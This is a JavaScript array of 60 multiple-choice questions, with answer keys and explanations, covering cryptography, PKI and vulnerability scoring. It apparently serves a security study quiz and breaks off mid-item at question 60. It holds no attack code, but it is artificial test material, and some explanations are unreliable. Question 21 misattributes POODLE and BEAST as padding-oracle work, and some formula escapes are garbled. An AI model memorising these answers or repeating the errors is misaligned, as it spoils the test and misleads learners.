var book5MCQs = [
  {
    "id": 1,
    "question": "What fundamental security property guarantees that sensitive data is accessible only to authorized entities and protected from unauthorized disclosure?",
    "options": [
      "Confidentiality",
      "Integrity",
      "Availability",
      "Non-repudiation"
    ],
    "answer": 0,
    "explanation": "Confidentiality ensures that information is not made available or disclosed to unauthorized individuals, entities, or processes, achieved via encryption, access control, and classification."
  },
  {
    "id": 2,
    "question": "What security property guarantees that information has not been altered, tampered with, or fabricated by an unauthorized party during transit or storage?",
    "options": [
      "Confidentiality",
      "Integrity",
      "Accountability",
      "Anonymity"
    ],
    "answer": 1,
    "explanation": "Integrity ensures the accuracy, completeness, and uncorrupted state of data. It is enforced using cryptographic hashes, message authentication codes (MAC), and digital signatures."
  },
  {
    "id": 3,
    "question": "What security property guarantees that computing services, systems, and networks remain operable and accessible to authorized users upon request?",
    "options": [
      "Non-repudiation",
      "Authorization",
      "Availability",
      "Confidentiality"
    ],
    "answer": 2,
    "explanation": "Availability ensures timely and reliable access to and use of information and services, protected against hardware failures and Denial of Service (DoS) attacks via redundancy and load balancing."
  },
  {
    "id": 4,
    "question": "What security service ensures that a party to a communication or transaction cannot falsely deny having sent a message or initiated an action?",
    "options": [
      "Authentication",
      "Availability",
      "Authorization",
      "Non-repudiation"
    ],
    "answer": 3,
    "explanation": "Non-repudiation provides irrefutable mathematical proof of the origin and delivery of data, preventing senders or receivers from denying involvement, typically implemented using asymmetric digital signatures."
  },
  {
    "id": 5,
    "question": "In the AAA security architecture framework, what do the three 'A' initials represent?",
    "options": [
      "Authentication, Authorization, and Accounting (or Auditing)",
      "Availability, Assurance, and Assessment",
      "Asymmetric, Advanced, and Automated",
      "Access, Accuracy, and Administration"
    ],
    "answer": 0,
    "explanation": "AAA represents: Authentication (verifying who you are), Authorization (determining what resources you can access), and Accounting/Auditing (tracking what actions you performed and when)."
  },
  {
    "id": 6,
    "question": "What core cryptographic tenet, known as Kerckhoffs's Principle, forms the bedrock of modern public cryptographic standards?",
    "options": [
      "A cryptographic cipher must scramble both the algorithm and the source code using proprietary hardware chips",
      "A cryptographic system must remain secure even if everything about the design and algorithm is public knowledge, provided only the secret key is kept secure",
      "The secret key must be mathematically derived from the physical MAC address of the host processor",
      "Cryptographic keys must be rotated automatically every sixty seconds to prevent brute-force recovery"
    ],
    "answer": 1,
    "explanation": "Auguste Kerckhoffs stated that a cryptosystem must be secure even if the attacker knows the complete algorithm; security must reside solely in the secrecy of the key ('security through obscurity' is rejected)."
  },
  {
    "id": 7,
    "question": "What classical cipher is mathematically proven to achieve 'Perfect Secrecy' (information-theoretic security) if its key is truly random, never reused, and equal to message length?",
    "options": [
      "Playfair Cipher",
      "Vigen\u00e8re Cipher",
      "One-Time Pad (Vernam Cipher)",
      "Enigma Rotor Cipher"
    ],
    "answer": 2,
    "explanation": "Claude Shannon proved that the One-Time Pad (OTP) offers perfect secrecy: if the key is truly random, used only once, and as long as the plaintext, the ciphertext provides zero statistical information about the plaintext."
  },
  {
    "id": 8,
    "question": "Why is the One-Time Pad (OTP) rarely utilized in practical commercial Internet communications despite offering perfect secrecy?",
    "options": [
      "The encryption algorithm requires millions of computational cycles per byte",
      "Quantum computers can factor One-Time Pad modular additions in polynomial time",
      "The cipher fails to operate over standard TCP/IP packet switching networks",
      "The key distribution problem: securely exchanging a truly random key as long as the message requires a secure channel of equal capacity to the message itself"
    ],
    "answer": 3,
    "explanation": "OTP requires keys that are genuinely random, never reused, and equal in length to the payload. Distributing and managing keys of massive size securely across millions of web users is physically impractical."
  },
  {
    "id": 9,
    "question": "What classical polyalphabetic substitution cipher uses a repeating keyword to shift alphabet characters using a 26x26 tabula recta grid?",
    "options": [
      "Vigen\u00e8re Cipher",
      "Caesar Cipher (Monoalphabetic)",
      "Rail Fence Cipher (Transposition)",
      "Atbash Cipher"
    ],
    "answer": 0,
    "explanation": "The Vigen\u00e8re cipher uses a keyword repeated across the plaintext, shifting each character using a Tabula Recta. It resists simple frequency analysis until the keyword length is deduced (e.g. via Kasiski examination)."
  },
  {
    "id": 10,
    "question": "What cryptanalytic technique developed by Friedrich Kasiski breaks repeating-key polyalphabetic ciphers by finding the greatest common divisor of distances between repeated ciphertext strings?",
    "options": [
      "Linear Cryptanalysis",
      "Kasiski Examination (or Kasiski Test)",
      "Differential Fault Analysis",
      "Integral Cryptanalysis"
    ],
    "answer": 1,
    "explanation": "The Kasiski examination locates identical repeating sequences in the ciphertext. The distances between repetitions reveal probable multiples of the keyword length, reducing the cipher to parallel Caesar shifts."
  },
  {
    "id": 11,
    "question": "What is the mathematical definition of a 'Stream Cipher' versus a 'Block Cipher'?",
    "options": [
      "Stream ciphers utilize public-key math; block ciphers utilize symmetric shared keys",
      "Stream ciphers operate exclusively over satellite radio; block ciphers run on Ethernet",
      "Stream ciphers encrypt plaintext bit-by-bit (or byte-by-byte) using a pseudorandom keystream generator; block ciphers encrypt fixed-size chunks of data as discrete units",
      "Stream ciphers require hardware initialization; block ciphers run in software"
    ],
    "answer": 2,
    "explanation": "Stream ciphers (RC4, ChaCha20) generate a continuous pseudorandom keystream XORed bit-by-bit with plaintext. Block ciphers (AES, DES) process data in fixed blocks (e.g. 64 or 128 bits) with multi-round permutations."
  },
  {
    "id": 12,
    "question": "What block size and effective key length are defined by the Data Encryption Standard (DES)?",
    "options": [
      "128-bit block size and 128-bit key length",
      "64-bit block size and 64-bit effective key length",
      "32-bit block size and 56-bit key length",
      "64-bit block size and 56-bit effective key length (with 8 parity bits)"
    ],
    "answer": 3,
    "explanation": "DES operates on 64-bit blocks using a 56-bit key (64 bits are input, but 8 are discarded as parity check bits). Its 56-bit key space ($2^{56}$) is trivial to brute-force on modern hardware."
  },
  {
    "id": 13,
    "question": "How many Feistel rounds are executed within the Data Encryption Standard (DES) algorithm?",
    "options": [
      "16 rounds",
      "10 rounds",
      "12 rounds",
      "14 rounds"
    ],
    "answer": 0,
    "explanation": "DES utilizes a 16-round Feistel network architecture, splitting the 64-bit block into 32-bit halves and processing them with round subkeys, expansion, S-boxes, and P-box permutations."
  },
  {
    "id": 14,
    "question": "What is 'Meet-in-the-Middle Attack' in block cipher cryptanalysis, and why did it render Double DES (2DES) insecure?",
    "options": [
      "An attacker intercepts network packets between two communicating routers on the wire",
      "An attacker encrypts from plaintext and decrypts from ciphertext simultaneously, reducing the effective security of 2DES from 112 bits down to only 57 bits",
      "An attacker forces the CPU to execute instructions out of order using speculative caching",
      "An attacker overwrites the Master Boot Record partition table using administrative APIs"
    ],
    "answer": 1,
    "explanation": "Double DES ($C = E_{K2}(E_{K1}(P))$) seems to provide $2^{112}$ security. However, Meet-in-the-Middle computes $E_{K1}(P)$ forward and $D_{K2}(C)$ backward, matching tables in $2^{56}$ time and memory, necessitating Triple DES (3DES)."
  },
  {
    "id": 15,
    "question": "What block size and supported key lengths are specified for the Advanced Encryption Standard (AES / FIPS 197)?",
    "options": [
      "64-bit block size; supported key lengths of 56 and 112 bits",
      "256-bit block size; supported key lengths of 256 and 512 bits",
      "Fixed 128-bit block size; supported key lengths of 128, 192, and 256 bits",
      "Variable 64-bit or 128-bit block size; 1024-bit key length"
    ],
    "answer": 2,
    "explanation": "AES (based on Rijndael) standardizes a fixed 128-bit block size (16 bytes) and supports three key sizes: 128 bits (10 rounds), 192 bits (12 rounds), and 256 bits (14 rounds)."
  },
  {
    "id": 16,
    "question": "How many transformation rounds are executed in AES-128, AES-192, and AES-256 respectively?",
    "options": [
      "16 rounds, 32 rounds, and 64 rounds",
      "8 rounds, 10 rounds, and 12 rounds",
      "12 rounds, 16 rounds, and 20 rounds",
      "10 rounds, 12 rounds, and 14 rounds"
    ],
    "answer": 3,
    "explanation": "AES round counts: AES-128 executes 10 rounds; AES-192 executes 12 rounds; AES-256 executes 14 rounds. Each round consists of SubBytes, ShiftRows, MixColumns, and AddRoundKey (final round omits MixColumns)."
  },
  {
    "id": 17,
    "question": "Which transformation step in the AES round provides non-linear confusion by replacing each byte with an S-Box lookup table entry?",
    "options": [
      "SubBytes",
      "ShiftRows",
      "MixColumns",
      "AddRoundKey"
    ],
    "answer": 0,
    "explanation": "SubBytes is the sole non-linear transformation in AES, substituting each byte with an entry from an invertible S-box constructed from the multiplicative inverse over Galois Field $GF(2^8)$ followed by an affine transformation."
  },
  {
    "id": 18,
    "question": "Which transformation step in the AES round mixes data across bytes within each column using matrix multiplication over Galois Field GF(2^8)?",
    "options": [
      "SubBytes",
      "MixColumns",
      "ShiftRows",
      "AddRoundKey"
    ],
    "answer": 1,
    "explanation": "MixColumns provides linear diffusion by treating each 4-byte column of the state array as a polynomial over $GF(2^8)$ and multiplying it by a fixed circulant matrix."
  },
  {
    "id": 19,
    "question": "Which block cipher mode of operation encrypts each plaintext block independently with the secret key without using an Initialization Vector (IV)?",
    "options": [
      "CBC (Cipher Block Chaining Mode)",
      "CTR (Counter Mode)",
      "ECB (Electronic Codebook Mode)",
      "GCM (Galois/Counter Mode)"
    ],
    "answer": 2,
    "explanation": "ECB mode encrypts each 128-bit block independently with the key. Identical plaintext blocks produce identical ciphertext blocks, notoriously leaking visual data patterns (e.g. the ECB Penguin)."
  },
  {
    "id": 20,
    "question": "In Cipher Block Chaining (CBC) mode, how is the first plaintext block randomized before encryption?",
    "options": [
      "It is multiplied by the RSA public exponent (e=65537)",
      "It is padded with hexadecimal null bytes until reaching 4096 bits",
      "It is hashed using the MD5 digest algorithm",
      "It is bitwise XORed with a random, unpredictable Initialization Vector (IV)"
    ],
    "answer": 3,
    "explanation": "In CBC mode, the first block is XORed with a random, unique Initialization Vector (IV) before block encryption ($C_1 = E_K(P_1 \\oplus IV)$). Each subsequent block is XORed with the preceding ciphertext block ($C_i = E_K(P_i \\oplus C_{i-1})$)."
  },
  {
    "id": 21,
    "question": "What web application vulnerability (demonstrated by Juliano Rizzo and Thai Duong in the POODLE and BEAST exploits) targets CBC mode decryption?",
    "options": [
      "Padding Oracle Attack",
      "SQL Injection Attack",
      "Cross-Site Scripting Attack",
      "Server-Side Request Forgery"
    ],
    "answer": 0,
    "explanation": "Padding Oracle attacks exploit server error responses (differentiating between valid PKCS#7 padding and invalid padding) to systematically decrypt CBC-mode ciphertext byte-by-byte without knowing the key."
  },
  {
    "id": 22,
    "question": "What block cipher mode converts a block cipher into a stream cipher by encrypting sequential counter values, supporting multi-threaded parallel processing?",
    "options": [
      "ECB (Electronic Codebook)",
      "CTR (Counter Mode)",
      "CBC (Cipher Block Chaining)",
      "XTS (XEX Tweakable Block Cipher)"
    ],
    "answer": 1,
    "explanation": "CTR mode encrypts an incrementing counter value ($E_K(Nonce \\parallel Counter)$) and XORs the resulting keystream with the plaintext. Because counters are independent, encryption and decryption can be completely parallelized."
  },
  {
    "id": 23,
    "question": "What is an 'AEAD' (Authenticated Encryption with Associated Data) mode of operation?",
    "options": [
      "A mode that encrypts data exclusively when a human user enters a biometric fingerprint",
      "A mode that rotates symmetric encryption keys across four distinct physical hardware chips",
      "A cryptographic mode that provides confidentiality, integrity, AND authenticity verification in a single cryptographic pass (e.g. AES-GCM, ChaCha20-Poly1305)",
      "An unencrypted transmission mode used exclusively for public DNS lookups"
    ],
    "answer": 2,
    "explanation": "AEAD combines encryption with an authentication tag (MAC). It protects the confidentiality and integrity of plaintext, while also authenticating unencrypted header metadata (Associated Data, AAD)."
  },
  {
    "id": 24,
    "question": "What AEAD mode of operation pairs Counter mode encryption with universal hashing over a Galois field (GHASH) to generate a 128-bit authentication tag?",
    "options": [
      "AES-ECB",
      "AES-CBC",
      "AES-XTS",
      "AES-GCM (Galois/Counter Mode)"
    ],
    "answer": 3,
    "explanation": "AES-GCM (Galois/Counter Mode) combines CTR mode encryption with Galois Field multiplier authentication (GHASH), generating an authentication tag that confirms the data was not modified in transit."
  },
  {
    "id": 25,
    "question": "What specialized block cipher mode is standardized under IEEE 1619 for sector-level Full Disk Encryption (used in BitLocker and FileVault)?",
    "options": [
      "XTS-AES",
      "AES-ECB",
      "AES-OFB",
      "AES-CFB"
    ],
    "answer": 0,
    "explanation": "XTS-AES is designed specifically for storage encryption. It uses a tweak value (derived from the logical sector number) and two AES keys, ensuring identical plaintext written to different disk sectors encrypts to different ciphertexts. (XEX-based Tweaked-codebook mode with ciphertext Stealing)"
  },
  {
    "id": 26,
    "question": "On what hard mathematical problem is the security of the RSA public-key cryptosystem fundamentally based?",
    "options": [
      "The difficulty of solving the Discrete Logarithm Problem in finite cyclic groups",
      "The computational difficulty of factoring the product of two large prime numbers (Prime Factorization Problem)",
      "The shortest vector problem in multi-dimensional Euclidean lattices",
      "The difficulty of computing SHA-256 pre-images in polynomial time"
    ],
    "answer": 1,
    "explanation": "RSA relies on the fact that multiplying two large primes ($n = p \times q$) is computationally easy, but factoring their product $n$ back into $p$ and $q$ is practically intractable for large integers (e.g. 2048+ bits)."
  },
  {
    "id": 27,
    "question": "In RSA key generation, how is Euler's totient function $\\phi(n)$ calculated from two distinct prime numbers $p$ and $q$?",
    "options": [
      "$\\phi(n) = (p + 1)(q + 1)$",
      "$\\phi(n) = p^2 + q^2$",
      "$\\phi(n) = (p - 1)(q - 1)$",
      "$\\phi(n) = \\sqrt{p \\times q}$"
    ],
    "answer": 2,
    "explanation": "For $n = p \times q$ where $p$ and $q$ are distinct primes, Euler's totient function $\\phi(n)$ (the count of integers up to $n$ coprime to $n$) is exactly $(p - 1)(q - 1)$."
  },
  {
    "id": 28,
    "question": "What value is universally chosen as the public encryption exponent $e$ in modern RSA implementations due to its low Hamming weight?",
    "options": [
      "3",
      "257 ($2^8 + 1$)",
      "1,048,576 ($2^{20}$)",
      "65,537"
    ],
    "answer": 3,
    "explanation": "The Fermat prime $F_4 = 65537$ (hex: 0x10001) is the standard choice for RSA exponent $e$. It has only two 1-bits in binary, making modular exponentiation fast while avoiding small-exponent attacks. ($2^{16} + 1$, also known as Fermat prime $F_4$)"
  },
  {
    "id": 29,
    "question": "What padding scheme is mandatory in modern RSA encryption to prevent Coppersmith's and Bleichenbacher's chosen-ciphertext attacks?",
    "options": [
      "RSA-OAEP (Optimal Asymmetric Encryption Padding)",
      "PKCS#1 v1.5 Zero Padding",
      "Bitwise Null Padding",
      "DES Parity Bit Padding"
    ],
    "answer": 0,
    "explanation": "RSA-OAEP (Optimal Asymmetric Encryption Padding) is a Feistel-based padding scheme that introduces randomness and all-or-nothing transforms, making RSA probabilistically secure against chosen-ciphertext attacks."
  },
  {
    "id": 30,
    "question": "On what hard mathematical problem is the classic Diffie-Hellman (DH) key exchange protocol based?",
    "options": [
      "Integer prime factorization problem",
      "Discrete Logarithm Problem (DLP) over a finite prime field",
      "Elliptic curve point duplication problem",
      "Quantum superposition collapse problem"
    ],
    "answer": 1,
    "explanation": "Diffie-Hellman relies on the Discrete Logarithm Problem: given base $g$, prime $p$, and $A = g^a \\pmod p$, it is computationally infeasible to determine secret exponent $a$ when $p$ is sufficiently large."
  },
  {
    "id": 31,
    "question": "What property is provided by Ephemeral Diffie-Hellman (DHE / ECDHE) key exchanges in Transport Layer Security (TLS 1.3)?",
    "options": [
      "Immediate hardware acceleration across multi-core processors",
      "Permanent storage of session keys inside the client's Master File Table",
      "Perfect Forward Secrecy (PFS - compromise of the server's long-term private key does NOT compromise past recorded sessions)",
      "Biometric user authentication verified by cellular base stations"
    ],
    "answer": 2,
    "explanation": "Ephemeral Diffie-Hellman generates fresh, temporary DH keypairs for every session. Even if an attacker steals the server's long-term certificate private key years later, they cannot decrypt past captured traffic."
  },
  {
    "id": 32,
    "question": "On what mathematical foundation is Elliptic Curve Cryptography (ECC) established?",
    "options": [
      "The factoring of composite RSA modulus numbers using sieve algorithms",
      "The geometric intersection of non-Euclidean hyperbolic triangles",
      "The statistical distribution of pseudorandom numbers generated by linear feedback shift registers",
      "The algebraic structure of elliptic curves over finite fields and the Elliptic Curve Discrete Logarithm Problem (ECDLP)"
    ],
    "answer": 3,
    "explanation": "ECC security relies on the Elliptic Curve Discrete Logarithm Problem (ECDLP): given point $P$ and $Q = dP$ on curve $y^2 = x^3 + ax + b \\pmod p$, finding scalar multiplier $d$ is computationally intractable."
  },
  {
    "id": 33,
    "question": "What major security efficiency advantage does Elliptic Curve Cryptography (ECC) provide compared to traditional RSA?",
    "options": [
      "ECC provides equivalent cryptographic security strength with drastically smaller key sizes (e.g. 256-bit ECC $\\approx$ 3072-bit RSA)",
      "ECC does not require the use of any mathematical multiplication operations",
      "ECC private keys can be printed openly in public telephone directories",
      "ECC encryption operates without needing any digital signature verification"
    ],
    "answer": 0,
    "explanation": "Because solving ECDLP is much harder than factoring, ECC achieves equal security with vastly smaller keys: a 256-bit ECC key matches a 3072-bit RSA key, drastically reducing bandwidth, storage, and CPU consumption."
  },
  {
    "id": 34,
    "question": "What high-speed, modern elliptic curve signature algorithm implemented over Curve25519 is widely adopted in TLS 1.3, SSH, and Signal?",
    "options": [
      "ECDSA over NIST P-256",
      "Ed25519",
      "RSA-4096",
      "ElGamal Signature Scheme"
    ],
    "answer": 1,
    "explanation": "Ed25519 (based on Curve25519) provides high security (128-bit), immune to timing attacks, eliminates random number generator vulnerabilities of ECDSA, and executes signatures rapidly. (Edwards-curve Digital Signature Algorithm / EdDSA)"
  },
  {
    "id": 35,
    "question": "What property of a cryptographic hash function mandates that it is computationally infeasible to find ANY two distinct inputs $x$ and $y$ such that $H(x) = H(y)$?",
    "options": [
      "Pre-image Resistance (One-Way Property)",
      "Second Pre-image Resistance (Weak Collision Resistance)",
      "Collision Resistance (Strong Collision Resistance)",
      "Avalanche Effect"
    ],
    "answer": 2,
    "explanation": "Collision resistance means it is infeasible to find ANY pair of different messages $x \neq y$ that yield the same hash $H(x) = H(y)$. By the Birthday Paradox, this requires roughly $2^{n/2}$ operations."
  },
  {
    "id": 36,
    "question": "What property of a cryptographic hash function mandates that given a hash digest $h$, it is computationally infeasible to find original input $x$ such that $H(x) = h$?",
    "options": [
      "Collision Resistance",
      "Second Pre-image Resistance",
      "Non-repudiation",
      "Pre-image Resistance (One-Way Property)"
    ],
    "answer": 3,
    "explanation": "Pre-image resistance (the one-way property) means that given only hash output $h$, it is computationally impossible to reverse the function to determine the input message $x$ (requires $2^n$ operations)."
  },
  {
    "id": 37,
    "question": "What property of a cryptographic hash function mandates that given a specific input $x$, it is computationally infeasible to find a different input $y$ such that $H(x) = H(y)$?",
    "options": [
      "Second Pre-image Resistance",
      "Pre-image Resistance",
      "Collision Resistance",
      "Completeness Property"
    ],
    "answer": 0,
    "explanation": "Second pre-image resistance means that given a specific message $x$, an attacker cannot craft an alternate message $y \neq x$ with the exact same hash (requires $2^n$ operations). (Weak Collision Resistance)"
  },
  {
    "id": 38,
    "question": "What mathematical principle explains why finding a hash collision among arbitrary messages requires only approximately $2^{n/2}$ operations instead of $2^n$?",
    "options": [
      "The Law of Large Numbers",
      "The Birthday Paradox (Birthday Problem)",
      "Heisenberg's Uncertainty Principle",
      "The Chinese Remainder Theorem"
    ],
    "answer": 1,
    "explanation": "The Birthday Paradox shows that in a group of 23 people, the probability of two sharing a birthday exceeds 50%. In cryptography, finding ANY pair of messages with matching hashes requires only $\\approx 2^{n/2}$ attempts."
  },
  {
    "id": 39,
    "question": "In 2017, the CWI Amsterdam and Google 'SHAttered' research attack produced the first practical collision against which hashing algorithm?",
    "options": [
      "MD5",
      "SHA-256",
      "SHA-1",
      "SHA-3"
    ],
    "answer": 2,
    "explanation": "The SHAttered attack (Marc Stevens et al., 2017) generated two PDF files with completely different visual contents that produced the exact same SHA-1 digest, proving SHA-1 broken for digital signatures. (generating two distinct PDF documents with identical SHA-1 hashes)"
  },
  {
    "id": 40,
    "question": "What internal architectural design is utilized by the SHA-3 (Keccak) hashing standard, fundamentally differing from the Merkle-Damg\u00e5rd construction of MD5, SHA-1, and SHA-2?",
    "options": [
      "Feistel Permutation Network",
      "Linear Feedback Shift Register",
      "Tweakable Block Cipher Mesh",
      "Sponge Construction (absorbing and squeezing phases)"
    ],
    "answer": 3,
    "explanation": "SHA-3 uses the Keccak sponge construction. It 'absorbs' message blocks into a 1600-bit internal state using permutations, and then 'squeezes' out hash output bits, immune to length-extension attacks."
  },
  {
    "id": 41,
    "question": "What vulnerability plagues Merkle-Damg\u00e5rd hash functions (MD5, SHA-1, SHA-256) when used naively for Message Authentication Codes ($MAC = H(Key \\parallel Message)$)?",
    "options": [
      "Length Extension Attack",
      "Padding Oracle Attack",
      "Meet-in-the-Middle Attack",
      "Rowhammer Attack"
    ],
    "answer": 0,
    "explanation": "In Merkle-Damg\u00e5rd hashes, the internal state after processing a message equals the final hash digest. An attacker can append data to the message and continue the hash computation without knowing the secret prefix key."
  },
  {
    "id": 42,
    "question": "What standardized mechanism prevents length-extension attacks by computing nested hashes with inner and outer padding keys?",
    "options": [
      "CRC32 Checksumming",
      "HMAC",
      "Adler-32 Checksum Algorithm",
      "Cipher Block Chaining MAC"
    ],
    "answer": 1,
    "explanation": "HMAC calculates $H((K \\oplus opad) \\parallel H((K \\oplus ipad) \\parallel m))$. The double-hashing with inner and outer padded keys completely defeats length extension attacks. (Hash-based Message Authentication Code - RFC 2104)"
  },
  {
    "id": 43,
    "question": "In a Digital Signature scheme, what key is used to sign the message digest, and what key is used to verify the signature?",
    "options": [
      "The sender signs with the recipient's public key; the recipient verifies with their private key",
      "The sender signs with a shared symmetric AES key; the recipient verifies with the same key",
      "The sender signs with their private key; the recipient verifies with the sender's public key",
      "The sender signs with the Certificate Authority's root key; the recipient verifies with an IP address"
    ],
    "answer": 2,
    "explanation": "Digital signatures provide authenticity and non-repudiation: only the sender possesses the private key to generate the signature, while anyone possessing the sender's public key can mathematically verify it."
  },
  {
    "id": 44,
    "question": "What international standard defines the format and structure of public key digital certificates (e.g. used in HTTPS/TLS)?",
    "options": [
      "IEEE 802.11ac standard",
      "RFC 793 standard",
      "ISO/IEC 27001 standard",
      "ITU-T X.509 standard"
    ],
    "answer": 3,
    "explanation": "X.509 is the International Telecommunication Union (ITU-T) standard specifying public key certificates. It binds an identity (Subject) to a public key, certified by the cryptographic signature of a CA."
  },
  {
    "id": 45,
    "question": "What field in a modern X.509 v3 digital certificate allows a single certificate to secure multiple domain names (e.g. example.com, api.example.com)?",
    "options": [
      "Subject Alternative Name (SAN) extension",
      "Common Name (CN) attribute",
      "Key Usage field",
      "Certificate Serial Number"
    ],
    "answer": 0,
    "explanation": "While older certificates used the Common Name (CN), modern TLS relies on the Subject Alternative Name (SAN) extension to specify multiple hostnames, wildcard domains, and IP addresses secured by the certificate."
  },
  {
    "id": 46,
    "question": "What protocol allows a web browser to query a Certificate Authority in real time to check if a specific certificate has been revoked?",
    "options": [
      "CRL (Certificate Revocation List)",
      "OCSP (Online Certificate Status Protocol - RFC 6960)",
      "BGP (Border Gateway Protocol)",
      "SNMP (Simple Network Management Protocol)"
    ],
    "answer": 1,
    "explanation": "OCSP queries the CA's OCSP responder in real time with the certificate serial number, returning 'Good', 'Revoked', or 'Unknown'. OCSP Stapling allows the web server to query the CA and attach the signed response in the TLS handshake."
  },
  {
    "id": 47,
    "question": "In Public Key Infrastructure (PKI), what is a 'Certificate Revocation List' (CRL)?",
    "options": [
      "A database of all active domain names registered with ICANN",
      "A registry of compromised hardware write-blocker serial numbers",
      "A periodically published, digitally signed list of revoked digital certificate serial numbers that should no longer be trusted",
      "An unencrypted log of all user passwords typed into web browsers"
    ],
    "answer": 2,
    "explanation": "A CRL is a time-stamped list published by a CA enumerating serial numbers of revoked certificates (e.g., due to private key compromise). Clients download CRLs to verify that certificates have not been revoked."
  },
  {
    "id": 48,
    "question": "What security transparency framework requires Certificate Authorities to append all newly issued SSL/TLS certificates to publicly auditable, append-only cryptographic log servers?",
    "options": [
      "Domain Name System Security Extensions (DNSSEC)",
      "HTTP Strict Transport Security (HSTS)",
      "DNS Certification Authority Authorization (CAA)",
      "Certificate Transparency (CT - RFC 6962)"
    ],
    "answer": 3,
    "explanation": "Certificate Transparency (CT) uses Merkle tree logs to record all public certificate issuances publicly. Browsers require Signed Certificate Timestamps (SCTs), allowing domain owners to detect unauthorized or rogue certificates."
  },
  {
    "id": 49,
    "question": "What DNS resource record allows domain owners to declare which specific Certificate Authorities (CAs) are authorized to issue certificates for their domain?",
    "options": [
      "CAA (Certification Authority Authorization) record",
      "SPF (Sender Policy Framework) record",
      "MX (Mail Exchange) record",
      "PTR (Pointer) record"
    ],
    "answer": 0,
    "explanation": "A DNS CAA record (RFC 6844) lets domain owners specify which CAs (e.g., Let's Encrypt, DigiCert) are permitted to issue certificates for their domain, preventing rogue or compromised CAs from issuing fake certs."
  },
  {
    "id": 50,
    "question": "What HTTP response header forces web browsers to interact with a website exclusively over encrypted HTTPS connections, preventing SSL stripping attacks?",
    "options": [
      "Content-Security-Policy",
      "HSTS",
      "X-Frame-Options",
      "X-XSS-Protection"
    ],
    "answer": 1,
    "explanation": "HSTS instructs browsers that the domain must only be accessed using HTTPS. Even if the user types 'http://' or an attacker attempts SSL stripping, the browser automatically rewrites requests to 'https://'. (HTTP Strict Transport Security - Strict-Transport-Security)"
  },
  {
    "id": 51,
    "question": "In information security risk management, what is the fundamental mathematical relationship between Risk, Threat, Vulnerability, and Impact?",
    "options": [
      "Risk = Threat + Vulnerability - Impact",
      "Risk = Asset Value / Encryption Key Length",
      "Risk = Threat x Vulnerability x Impact (or Likelihood x Impact)",
      "Risk = Password Entropy x Network Bandwidth"
    ],
    "answer": 2,
    "explanation": "Risk represents the potential for loss. It occurs at the intersection where a Threat (actor/action) exploits a Vulnerability (weakness) on an asset, resulting in an Impact (damage/cost)."
  },
  {
    "id": 52,
    "question": "What is the difference between a 'Vulnerability' and a 'Weakness' under cybersecurity standards (CVE vs CWE)?",
    "options": [
      "A weakness is hardware-based; a vulnerability is software-based",
      "A weakness is always publicly disclosed; a vulnerability is kept secret forever",
      "A weakness requires administrative credentials; a vulnerability runs unauthenticated",
      "A weakness (CWE) is a type of flaw or bug in software architecture; a vulnerability (CVE) is a specific, instantiated occurrence of a flaw in a concrete product version that can be exploited"
    ],
    "answer": 3,
    "explanation": "CWE (Common Weakness Enumeration) categorizes underlying software errors (e.g., CWE-89 SQL Injection, CWE-79 XSS). CVE (Common Vulnerabilities and Exposures) assigns unique IDs to specific, disclosed instances in real software."
  },
  {
    "id": 53,
    "question": "What standard naming format is utilized by MITRE to catalog public cybersecurity vulnerabilities?",
    "options": [
      "CVE-YYYY-NNNNN (e.g. CVE-2021-44228)",
      "MSFT-YYYY-NNNN",
      "VULN-ID-NNNNN",
      "NIST-SP-NNNN"
    ],
    "answer": 0,
    "explanation": "Common Vulnerabilities and Exposures (CVE) uses the standardized syntax: 'CVE-' followed by the 4-digit calendar year of publication and a sequential numeric identifier of 4 or more digits."
  },
  {
    "id": 54,
    "question": "Under the Common Vulnerability Scoring System (CVSS v3.1), what score range corresponds to a 'Critical' severity rating?",
    "options": [
      "7.0 to 8.9 (High)",
      "9.0 to 10.0",
      "4.0 to 6.9 (Medium)",
      "0.1 to 3.9 (Low)"
    ],
    "answer": 1,
    "explanation": "CVSS v3.1 qualitative severity ratings: None (0.0), Low (0.1 - 3.9), Medium (4.0 - 6.9), High (7.0 - 8.9), and Critical (9.0 - 10.0)."
  },
  {
    "id": 55,
    "question": "What metric in the CVSS v3.1 Base Score group evaluates the context by which vulnerability exploitation is possible (Network, Adjacent, Local, Physical)?",
    "options": [
      "Attack Complexity (AC)",
      "Privileges Required (PR)",
      "Attack Vector (AV)",
      "User Interaction (UI)"
    ],
    "answer": 2,
    "explanation": "Attack Vector (AV) measures how remotely the flaw can be exploited: Network (AV:N - internet), Adjacent (AV:A - local subnet/Bluetooth), Local (AV:L - local console/shell), or Physical (AV:P - physical hardware access)."
  },
  {
    "id": 56,
    "question": "In a CVSS v3.1 vector string, what does 'UI:R' represent?",
    "options": [
      "User Interface: Responsive",
      "Universal Identifier: Revoked",
      "Underlying Infrastructure: Redundant",
      "User Interaction: Required"
    ],
    "answer": 3,
    "explanation": "UI evaluates whether exploitation requires human interaction: UI:N means exploitation is completely autonomous (zero user interaction); UI:R means a victim must click a phishing link, accept a prompt, or open an attachment. (a user must perform an action like clicking a link or opening a file to trigger exploitation)"
  },
  {
    "id": 57,
    "question": "In a CVSS v3.1 vector string, what does the 'Scope' (S) metric evaluate?",
    "options": [
      "Whether a vulnerability exploited in one security authority/component affects resources managed by a different authority/component (Scope Changed - S:C)",
      "The total geographic radius in kilometers where radio signals can be detected",
      "The number of physical CPU processor cores impacted by kernel memory corruption",
      "The legal jurisdiction governing criminal prosecution under federal law"
    ],
    "answer": 0,
    "explanation": "Scope measures whether a vulnerability in one software component impacts resources beyond its security boundary (e.g. escaping a virtual machine or container to compromise the hypervisor/host OS = Scope Changed, S:C)."
  },
  {
    "id": 58,
    "question": "What type of security assessment focuses exclusively on identifying, cataloging, and ranking vulnerabilities on a system using automated tools, WITHOUT actively exploiting them?",
    "options": [
      "Penetration Testing (PT)",
      "Vulnerability Assessment (VA)",
      "Red Teaming Adversary Simulation",
      "Threat Hunting Operation"
    ],
    "answer": 1,
    "explanation": "A Vulnerability Assessment (VA) is a broad, non-destructive automated scan identifying known vulnerabilities and missing patches across assets without actively exploiting them to verify exploitability."
  },
  {
    "id": 59,
    "question": "What type of security assessment actively exploits discovered vulnerabilities to prove business impact, simulate attacker actions, and bypass defenses?",
    "options": [
      "Vulnerability Scanning",
      "Code Quality Review",
      "Penetration Testing (PT)",
      "Compliance Audit"
    ],
    "answer": 2,
    "explanation": "Penetration Testing (ethical hacking) goes beyond vulnerability assessment by actively exploiting flaws to gain unauthorized access, elevate privileges, and simulate real-world adversary impact."
  },
  {
    "id": 60,
    "question": "What penetration testing engagement model provides the tester with zero prior knowledge of internal network architecture, source code, or credentials?",
    "options": [
